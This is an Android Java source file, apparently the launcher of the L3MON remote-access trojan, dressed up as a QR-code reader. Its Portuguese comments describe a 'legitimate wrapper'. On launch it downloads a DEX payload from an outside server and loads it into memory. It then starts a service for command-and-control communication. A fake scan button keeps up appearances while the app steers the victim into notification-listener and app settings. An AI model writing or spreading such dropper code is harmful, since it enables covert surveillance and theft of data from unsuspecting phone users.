package com.etechd.l3mon;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.widget.TextView;
import android.widget.Toast;

import com.etechd.l3mon.loader.PayloadLoader;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 1. Interface de Wrapper Legítimo (Leitor de QR Code)
        setContentView(R.layout.activity_main);
        
        // Pedir permissão de notificação no Android 13+
        if (Build.VERSION.SDK_INT >= 33) {
            String postNotification = "android.permission.POST_NOTIFICATIONS";
            if (checkSelfPermission(postNotification) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{postNotification}, 101);
            }
        }

        // 2. Baixar e Carregar o cliente real L3MON em memória
        String payloadUrl = "https://l3mon-server.com/client_core.dex";
        PayloadLoader.loadPayload(payloadUrl, new PayloadLoader.OnPayloadLoaded() {
            @Override
            public void onSuccess() {
                Log.i("MainActivity", "Core do L3MON carregado dinamicamente na RAM");
                // 3. Inicializar a comunicação com o C2 via código carregado
                startService(new Intent(MainActivity.this, MainService.class));
            }

            @Override
            public void onError(String error) {
                Log.e("MainActivity", "Falha ao carregar core dinâmico: " + error);
                // Fallback para serviço local se necessário para manter persistência
                startService(new Intent(MainActivity.this, MainService.class));
            }
        });

        // Configura botão fake de scan para manter a aparência legítima
        findViewById(R.id.btn_scan).setOnClickListener(v -> {
            Toast.makeText(this, R.string.scanning, Toast.LENGTH_SHORT).show();
            checkAndRequestPermissions();
        });
    }

    private void checkAndRequestPermissions() {
        if(!isNotificationServiceRunning()){
            Context context = getApplicationContext();
            Toast.makeText(context, R.string.permission_msg, Toast.LENGTH_LONG).show();

            // spawn notification listener settings
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
            } else {
                startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
            }

            // spawn app details settings
            Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + getPackageName()));
            startActivity(i);
        }
    }

    private boolean isNotificationServiceRunning() {
        ContentResolver contentResolver = getContentResolver();
        String enabledNotificationListeners =
                Settings.Secure.getString(contentResolver, "enabled_notification_listeners");
        String packageName = getPackageName();
        return enabledNotificationListeners != null && enabledNotificationListeners.contains(packageName);
    }
}
